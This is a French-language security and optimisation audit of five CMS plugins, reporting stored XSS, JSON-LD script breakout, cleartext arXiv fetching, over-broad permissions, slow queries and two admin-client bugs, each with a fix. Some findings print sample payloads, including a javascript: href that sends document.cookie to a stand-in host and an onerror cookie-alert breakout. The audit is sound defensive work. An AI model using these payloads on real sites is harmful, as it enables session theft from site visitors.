# Audit sécurité & optimisation — plugins Cannelle

**Date :** 2026-08-04
**Périmètre :** `src/plugins/*` uniquement (5 plugins, 239 fichiers)
**Méthode :** lecture statique de la surface d'attaque — routes HTTP, hooks de contenu, composants Astro, clients réseau, stores. Aucun test d'exploitation exécuté.

Plugins audités :

| Plugin | Capabilities déclarées | Routes |
|---|---|---|
| `ai-editorial-assistant` | `content:read`, `content:write`, `network:request` | 5 |
| `auto-internal-linker` | `content:read`, `taxonomies:read` | 3 |
| `glossary-cards` | `content:read`, `content:write` | 4 |
| `research-paper-embed` | `network:request` | 1 |
| `seo-pro` | `content:read`, `media:read`, `taxonomies:read` | 5 |

---

## Contexte de confiance vérifié

Ce qui protège déjà, et qu'il faut connaître avant de lire les findings :

- **Routes plugin authentifiées par défaut.** `node_modules/emdash/dist/astro/routes/api/plugins/_pluginId_/_...path_.mjs:31-40` : toute route non `public: true` exige permission + scope `admin` + en-tête CSRF `X-EmDash-Request: 1`. Aucun plugin ne déclare `public`.
- **`ctx.http.fetch` valide `allowedHosts` à chaque redirection.** Le `ollamaBaseUrl` configurable en admin **n'est pas** un SSRF : l'hôte est figé au build (`astro.config.mjs:31`). Correctement raisonné dans le code et documenté en commentaire.
- **Le mark `link` du cœur EmDash assainit les href** — `node_modules/emdash/src/components/marks/Link.astro:21` appelle `sanitizeHref`.

C'est ce dernier point qui rend les findings XSS ci-dessous exploitables : **les plugins court-circuitent ce composant** avec leurs propres rendus.

---

## SÉCURITÉ

### SEC-1 — XSS stocké : href non assaini dans le mark glossaire

**Fichier :** `src/plugins/glossary-cards/src/astro/GlossaryTooltip.astro:13`
**Sévérité :** HAUTE · **Catégorie :** `xss`

```astro
<a href={value.fullUrl} class="glossary-term" ...>
```

`markComponents = { glossaryTerm: GlossaryTooltip }` (`src/astro/index.ts:8`) remplace le rendu de mark du cœur pour ce type. Aucun `sanitizeHref` n'est appliqué, contrairement à `marks/Link.astro`.

**Chemin d'exploitation.** `value` est un `markDef` lu depuis le contenu stocké. Le hook `content:beforeSave` (`src/index.ts:159-165`) ne réécrit `fullUrl` **que si** le terme est retrouvé dans le glossaire :

```ts
const fresh = termById.get(mark.termId) ?? termByNormalized.get(normalize(mark.term));
if (!fresh) return def;   // ← markDef client conservé tel quel
```
(`src/lib/portable-text.ts:45-47`)

Un auteur qui écrit un `markDef` `{_type:"glossaryTerm", termId:"inexistant", fullUrl:"javascript:fetch('//x/'+document.cookie)"}` via l'API contenu voit son href rendu intact sur la page publique. La validation `saveTermSchema` (`src/routes/terms.ts:12`) porte sur la route glossaire, **pas** sur le markDef inséré dans l'article.

Le script client aggrave : `GlossaryScript.astro:31` réinjecte `fullUrl` dans un `href` via `innerHTML`, et `escapeHtml` n'échappe que `& < > "` — le schéma `javascript:` passe.

**Correctif.**

```astro
---
import { sanitizeHref } from "emdash";
const { value } = Astro.props;
const href = sanitizeHref(value.fullUrl);
---
```

Et côté client, filtrer le schéma avant d'écrire le lien (n'accepter que `/`, `http:`, `https:`, `mailto:`).

---

### SEC-2 — Évasion de bloc `<script>` dans les deux JSON-LD

**Fichiers :**
- `src/plugins/glossary-cards/src/astro/GlossaryJsonLd.astro:34`
- `src/plugins/research-paper-embed/src/astro/ResearchPaperJsonLd.astro:34`

**Sévérité :** HAUTE · **Catégorie :** `xss`

```astro
<script type="application/ld+json" set:html={JSON.stringify(graph)} is:inline />
```

`set:html` est la directive *non échappée* d'Astro — c'est son rôle. `JSON.stringify` échappe les guillemets et antislashs mais **laisse `<` et `/` intacts**. Le parseur HTML termine le bloc `<script>` au premier `</script`, sans considération du contexte JSON.

**Chemin d'exploitation.** Une définition de glossaire (jusqu'à 2000 caractères, aucun filtre — `src/routes/terms.ts:9`) contenant :

```
Un LLM.</script><img src=x onerror=alert(document.cookie)>
```

sort en HTML brut sur chaque article portant ce terme. Côté `research-paper-embed`, les champs vulnérables (`title`, `abstract`, `authors`) proviennent d'arXiv et Crossref — donc de contenu soumis par des tiers, hors du contrôle éditorial.

**Correctif** (à appliquer aux deux fichiers) :

```astro
const json = JSON.stringify(graph).replace(/</g, "\\u003c");
---
<script type="application/ld+json" set:html={json} is:inline />
```

L'échappement Unicode de `<` reste un `<` valide côté JSON — le parseur JSON-LD relit la même donnée — mais la chaîne servie ne contient plus le caractère `<`, donc le parseur HTML ne peut plus y voir une fin de `</script`.

---

### SEC-3 — Métadonnées arXiv récupérées en clair (`http://`)

**Fichier :** `src/plugins/research-paper-embed/src/lib/arxiv.ts:20`
**Sévérité :** MOYENNE · **Catégorie :** `cleartext_transport`

```ts
const url = `http://export.arxiv.org/api/query?id_list=${encodeURIComponent(id)}`;
```

`allowedHosts` autorise l'hôte mais n'impose pas le schéma. Un attaquant en position réseau entre le Worker et arXiv contrôle intégralement `title`, `summary`, `authors` — qui alimentent directement `ResearchPaperCard.astro` **et** le JSON-LD de SEC-2. Chaînés, ces deux findings donnent une XSS sans aucun accès au CMS.

`export.arxiv.org` sert HTTPS.

**Correctif :** `https://export.arxiv.org/api/query?...`

---

### SEC-4 — href non assainis sur la carte article de recherche

**Fichier :** `src/plugins/research-paper-embed/src/astro/ResearchPaperCard.astro:39, 42, 63, 70`
**Sévérité :** MOYENNE · **Catégorie :** `xss`

`value.url` et `value.pdfUrl` sont rendus en `href` sans `sanitizeHref`. Deux sources :

- **`value.url`** — saisi dans le `text_input` du bloc (`src/index.ts:69`). Aucune validation de schéma : `identify()` (`src/lib/identify.ts`) reconnaît un motif arXiv/DOI **n'importe où** dans la chaîne, donc `javascript:alert(1)/*arxiv.org/abs/1234.5678*/` est accepté comme entrée valide tout en restant l'href rendu.
- **`value.pdfUrl`** — `pickPdfLink` (`src/lib/crossref.ts:11-14`) retourne `link[].URL` de Crossref sans contrôle de schéma.

**Correctif :** `sanitizeHref` sur les quatre occurrences, et ancrer la validation dans `identify()` (`^(https?:\/\/)?(www\.)?arxiv\.org` plutôt qu'un `match` flottant).

---

### SEC-5 — `targetUrl` écrit sans validation dans les markDefs de lien

**Fichier :** `src/plugins/auto-internal-linker/src/domain/suggestion.ts:76-78`
**Sévérité :** BASSE (défense en profondeur) · **Catégorie :** `xss`

```ts
if (typeof a.targetUrl !== "string") return [];
return [{ keyword: a.keyword, targetId: a.targetId, targetUrl: a.targetUrl }];
```

Le champ `internal_links` est un champ `json` libre. Sa valeur `accepted[].targetUrl` devient un href de `markDef` `_type: "link"` écrit **en base** par le hook `content:beforeSave` (`src/content/apply-link.ts:85`).

Ce n'est **pas** exploitable sur le site : `marks/Link.astro` assainit au rendu. Mais le contenu empoisonné est persisté, et tout consommateur qui n'est pas ce composant — flux RSS, export API, application mobile, migration future — le recevra brut.

**Correctif :** valider dans `readFieldValue`, aligné sur `isSafeHref` qu'EmDash exporte déjà.

---

### SEC-6 — Aucune route ne déclare `permission` : `plugins:manage` requis partout

**Fichiers :** les 5 plugins, tous les blocs `routes:`
**Sévérité :** MOYENNE · **Catégorie :** `privilege_escalation`

```js
const permission = routeMeta.permission ?? "plugins:manage";
```
(`_...path_.mjs:32`)

Conséquence directe : pour qu'un rédacteur utilise le panneau SEO, l'assistant IA, les suggestions de liens ou le glossaire, il faut lui accorder `plugins:manage` — c'est-à-dire le droit d'**installer, désinstaller et reconfigurer les plugins**, y compris de lire/écrire les réglages contenant les clés API OpenAI et Anthropic.

Le plugin IA est le plus exposé : `prompts` accepte un patch arbitraire de prompt système (8000 caractères), et `apply-seo` écrit sur n'importe quelle entrée de n'importe quelle collection.

**Correctif :** déclarer une permission proportionnée par route.

```ts
suggest:  { input: …, permission: "content:update", handler: … },
settings: { input: …, permission: "plugins:manage", handler: … },
```

Lecture/analyse → permission contenu. Écriture de config et de prompts → `plugins:manage`.

---

### SEC-7 — Corps de réponse amont renvoyé au client admin

**Fichier :** `src/plugins/ai-editorial-assistant/src/providers/types.ts:66`
**Sévérité :** BASSE · **Catégorie :** `information_disclosure`

```ts
return `requête refusée (HTTP ${status})${detail ? ` : ${detail}` : ""}`;
```

300 caractères du corps d'erreur du fournisseur remontent jusqu'au navigateur via `toRouteResult`. Sur le chemin Ollama (localhost), cela transforme la route en primitive de lecture limitée sur un service local. Restreint aux détenteurs de `plugins:manage`, d'où la sévérité basse — mais SEC-6 élargit ce cercle.

---

## OPTIMISATION

### OPT-1 — `suggest` charge l'index de mots-clés entier à chaque appel

**Fichier :** `src/plugins/auto-internal-linker/src/routes/suggest.ts:48`
**Impact :** ÉLEVÉ

```ts
const indexed = await createKeywordIndexStore(ctx).all();
```

`all()` (`src/infrastructure/keyword-index-store.ts:63-74`) pagine par 100 en boucle **séquentielle**. Chaque ouverture du panneau de suggestions déclenche donc `ceil(total_mots_clés / 100)` allers-retours D1 en série, puis construit un trie complet en mémoire — travail jeté à la fin de la requête.

À 1 000 articles × ~10 mots-clés, cela fait ~100 requêtes séquentielles par ouverture de panneau. Goulot d'étranglement principal du dépôt.

**Pistes, par ordre de rapport effort/gain :**

1. Passer `limit: 1000` (D1 le supporte) — divise les allers-retours par 10 pour une ligne modifiée.
2. Mettre le trie sérialisé en cache KV, invalidé par les hooks d'indexation qui existent déjà (`afterPublish` / `afterDelete` / `afterRestore`).
3. À terme : ne charger que les mots-clés dont le préfixe apparaît dans l'article, via l'index `normalized` déjà déclaré (`src/index.ts:44`).

---

### OPT-2 — Le hook glossaire relit toute la table et sérialise deux fois le corps

**Fichier :** `src/plugins/glossary-cards/src/index.ts:154-166`
**Impact :** ÉLEVÉ

```ts
const terms = await createGlossaryStore(ctx).list();      // scan complet paginé
const hydrated = hydrateGlossaryMarks(body, terms);
if (JSON.stringify(hydrated) !== JSON.stringify(body)) {  // 2× sérialisation intégrale
```

Exécuté à **chaque enregistrement** de `posts` et `pages`, y compris pour les articles sans un seul mark glossaire. Sur un article long, les deux `JSON.stringify` dominent le budget CPU du hook (3 s).

**Correctif.** Sortir tôt si `collectGlossaryMarks(body).length === 0` — la fonction existe déjà dans `src/lib/portable-text.ts` et n'est utilisée que par le JSON-LD. Puis comparer par référence : `hydrateGlossaryMarks` renvoie déjà les blocs inchangés à l'identique (`return block`, ligne 40), donc `hydrated.some((b, i) => b !== body[i])` suffit et coûte O(n) pointeurs au lieu de deux sérialisations.

---

### OPT-3 — `findByTerm` ignore l'index `term` déclaré

**Fichier :** `src/plugins/glossary-cards/src/store/glossary-store.ts:46-55`
**Impact :** MOYEN

```ts
async findByTerm(term: string) {
  const all = await store.list();   // table entière
  return all.find(…) ?? null;
}
```

Le plugin déclare pourtant `indexes: ["term"]` (`src/index.ts:70`). Une `query({ where: { term: normalized }, limit: 1 })` répond en une requête.

Difficulté réelle : la recherche porte aussi sur `aliases`, non indexable tel quel — d'où probablement le raccourci. Stocker une colonne `normalizedKeys` indexée résoudrait les deux.

---

### OPT-4 — `rebuild` relit la configuration une fois par article

**Fichiers :** `src/plugins/auto-internal-linker/src/routes/rebuild.ts:33` + `src/infrastructure/index-entry.ts:19`
**Impact :** MOYEN

`rebuildRouteHandler` charge la config, puis appelle `indexEntry` par article — qui la recharge (`createKvConfigStore(ctx).get()`, aucune mémoïsation, cf. `kv-config.ts:11-13`). Sur 1 000 articles : 1 001 lectures KV pour une valeur constante.

**Correctif :** ajouter un paramètre `config` optionnel à `indexEntry`, et le passer depuis `rebuild`. Les hooks continuent d'appeler sans, comportement inchangé.

Plus structurellement : `rebuild` fait tout dans une seule requête HTTP (2+ requêtes D1 par article via `purgeTarget` puis `putMany`). Sur un corpus conséquent, cela dépassera la limite CPU du Worker. Un découpage par curseur — la route renvoie le curseur, l'UI reboucle — cadrerait avec la pagination déjà en place.

---

### OPT-5 — Pagination cassée sur `reports` par le filtre `grade`

**Fichier :** `src/plugins/seo-pro/src/routes/reports.ts:41`
**Impact :** MOYEN — c'est aussi un **bug fonctionnel**

```ts
const items = input.grade ? result.items.filter(r => r.grade === input.grade) : result.items;
```

Le filtre s'applique **après** la requête paginée. Avec `grade: "poor"` et `limit: 20`, une page peut renvoyer 3 éléments tout en signalant `hasMore: true` — le dashboard affiche des pages quasi vides, et l'utilisateur pagine à l'aveugle.

Le commentaire justifie l'approche par l'absence d'index sur `grade`, mais le grade dérive du score, lui indexé : les bornes de score correspondant à chaque grade sont traduisibles en `where` côté stockage.

---

### OPT-6 — `missing-meta` balaie tous les articles publiés sans cache

**Fichier :** `src/plugins/ai-editorial-assistant/src/routes/missing-meta.ts:61-112`
**Impact :** MOYEN

Le widget de tableau de bord parcourt l'intégralité des articles publiés (50 par page, boucle séquentielle) à chaque affichage. Le résultat est un agrégat qui bouge lentement : un cache KV de quelques minutes, invalidé par `content:afterSave`, supprimerait la quasi-totalité du coût.

---

### OPT-7 — Double parcours récursif de l'arbre Portable Text

**Fichier :** `src/plugins/seo-pro/src/infrastructure/content-loader.ts:103-122`
**Impact :** FAIBLE

`extractLinks` et `extractImages` appellent chacun `collect`, qui descend dans **toutes** les clés de chaque nœud (`Object.keys(n)`, ligne 139). Deux traversées complètes là où une seule, avec deux visiteurs, suffirait.

Marginal sur un article, non négligeable dans le hook `afterSave` qui a déjà `portableTextToPlainText` et `extractHeadings` à payer.

---

## BUGS FONCTIONNELS

### FUNC-1 — Deux clients admin omettent l'en-tête CSRF : routes en 403

**Fichiers :**
- `src/plugins/glossary-cards/src/admin/api.ts:8`
- `src/plugins/research-paper-embed/src/admin/RefreshButton.tsx:30`

Les deux utilisent `fetch` natif. Le dispatcher exige `X-EmDash-Request: 1` (`_...path_.mjs:38`) et répond `403 CSRF_REJECTED` sinon. **Toutes** les routes du glossaire et le bouton « Refresh metadata » sont donc actuellement inopérants depuis l'admin.

Le commentaire de `glossary-cards/src/admin/api.ts:5` — « on reste sur fetch natif pour ne pas ajouter de dépendance runtime » — décrit une contrainte qui n'existe pas : `ai-editorial-assistant` et `auto-internal-linker` importent tous deux `apiFetch` depuis `@emdash-cms/admin`, déjà présent dans le graphe admin.

**Correctif :** aligner sur `src/plugins/ai-editorial-assistant/src/ui/api.ts:25`.

---

### FUNC-2 — Le client glossaire déballe la mauvaise enveloppe

**Fichier :** `src/plugins/glossary-cards/src/admin/api.ts:13-17`
**Symptôme observé :** `Cannot read properties of undefined (reading 'map')` sur `admin/plugins/glossary-cards/glossary`

```ts
const data = (await res.json()) as { ok: boolean; data?: T; message?: string } | T;
if (typeof data === "object" && data !== null && "ok" in data && !data.ok) {
    throw new Error((data as { message?: string }).message ?? "Erreur du plugin");
}
return data as T;
```

Le client attend `{ ok, data, message }`. EmDash renvoie `{ success, data }` (`apiSuccess`, `_...path_.mjs:45`) ou `{ success: false, error }` en cas d'échec.

**Chaîne complète menant à l'erreur observée :**

1. `GlossaryManagerPage.load()` appelle `apiFetch<{terms: GlossaryTerm[]}>("terms/list", {})` (`GlossaryManagerPage.tsx:20`).
2. FUNC-1 fait répondre le serveur `403 { success: false, error: {...} }`.
3. Le test `"ok" in data` est **faux** (la clé est `success`, pas `ok`) — l'erreur n'est donc pas levée.
4. `apiFetch` retourne l'enveloppe d'erreur brute, castée en `{terms: […]}`.
5. `setTerms(res.terms)` reçoit `undefined` (`GlossaryManagerPage.tsx:21`).
6. `terms.map(…)` (`GlossaryManagerPage.tsx:123`) lève `Cannot read properties of undefined`.

Les deux bugs se masquent l'un l'autre : FUNC-2 avale l'erreur 403 de FUNC-1 et la transforme en crash de rendu sans rapport apparent. Corriger FUNC-1 seul ne suffira pas — le déballage restera faux et les erreurs futures passeront toujours pour des succès.

**Correctif :** réécrire `admin/api.ts` sur le modèle de `ai-editorial-assistant/src/ui/api.ts` — `apiFetch` de `@emdash-cms/admin` pour l'en-tête CSRF, puis déballage de `{ success, data }`. Ajouter un garde défensif `setTerms(res.terms ?? [])` côté page pour que la liste ne puisse plus faire tomber le rendu.

---

## Priorisation

| # | Finding | Sévérité / Impact | Effort |
|---|---|---|---|
| FUNC-2 | Enveloppe de réponse glossaire (crash observé) | Bloquant | ~15 lignes |
| FUNC-1 | En-tête CSRF manquant (×2) | Bloquant | ~10 lignes |
| SEC-1 | href glossaire non assaini | Haute | 3 lignes |
| SEC-2 | Évasion `</script>` JSON-LD (×2) | Haute | 2 lignes |
| SEC-3 | arXiv en HTTP clair | Moyenne | 1 caractère |
| SEC-4 | href carte article non assainis | Moyenne | 4 lignes |
| OPT-1 | `suggest` charge tout l'index | Élevé | 1 ligne (palliatif) → refonte |
| OPT-2 | Hook glossaire, sortie tardive | Élevé | ~5 lignes |
| SEC-6 | `plugins:manage` requis partout | Moyenne | Décision de modèle de droits |
| OPT-4 | Config relue par article | Moyen | ~5 lignes |
| OPT-5 | Pagination `reports` | Moyen | ~15 lignes |
| OPT-6 | `missing-meta` sans cache | Moyen | ~15 lignes |
| SEC-5 | `targetUrl` non validé | Basse | ~5 lignes |
| SEC-7 | Corps amont renvoyé au client | Basse | 1 ligne |
| OPT-3 | `findByTerm` sans index | Moyen | refonte du schéma de stockage |
| OPT-7 | Double parcours Portable Text | Faible | ~10 lignes |

SEC-2 et SEC-3 se chaînent en une XSS ne nécessitant aucun compte sur le CMS : à traiter ensemble.

---

## Notes transverses

**Le motif commun aux quatre findings XSS : substituer un composant de rendu au cœur du framework fait perdre ses garde-fous silencieusement.** EmDash assainit les href dans `marks/Link.astro`, mais `markComponents = { glossaryTerm: GlossaryTooltip }` remplace ce chemin pour un type de mark — et rien dans le typage ne signale que la protection a disparu. C'est le coût structurel des points d'extension : la sécurité n'est appliquée qu'au point de rendu, pas au point de stockage. Assainir **aussi** à l'écriture (`readFieldValue`, validation des markDefs) rendrait chaque nouveau composant de rendu sûr par défaut.

**`set:html` mérite un traitement à part.** Seule directive Astro qui désactive l'échappement. `JSON.stringify` ressemble beaucoup à un assainisseur sans en être un : il produit du JSON valide, pas du HTML sûr. Règle utilisable : tout `set:html` recevant du `JSON.stringify` doit échapper les `<` en séquence Unicode (voir SEC-2), quelle que soit la confiance placée dans la source.

**Le pattern « charger tout puis filtrer en mémoire » revient trois fois** (OPT-1, OPT-3, OPT-5) — toujours avec un index déclaré mais inutilisé juste à côté. Sur D1 dans un Worker, où chaque page est un aller-retour sérialisé et le budget CPU est borné, l'écart entre `.all()` et une requête indexée est un ordre de grandeur, pas un pourcentage.

**Les deux bugs fonctionnels partagent une cause :** un client HTTP écrit à la main plutôt que réutilisé. `ai-editorial-assistant` et `auto-internal-linker` ont le bon `call<T>()` — dupliqué à l'identique entre les deux. Le factoriser dans un module partagé du workspace éviterait qu'un troisième plugin le réinvente de travers.
